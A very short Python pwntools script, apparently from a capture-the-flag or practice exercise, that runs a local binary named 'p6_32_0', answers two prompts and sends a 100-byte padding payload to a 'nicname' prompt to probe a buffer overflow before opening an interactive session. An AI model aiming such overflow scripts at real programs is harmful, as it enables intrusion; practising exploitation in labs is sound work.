from pwn import *

#context.log_level = "DEBUG"

p = process("./p6_32_0")

p.sendlineafter(" : ", "aaaa")
p.sendlineafter(" : ", "bbbb")

payload = "a"*0x64
p.sendafter("nicname\n", payload)

p.interactive()
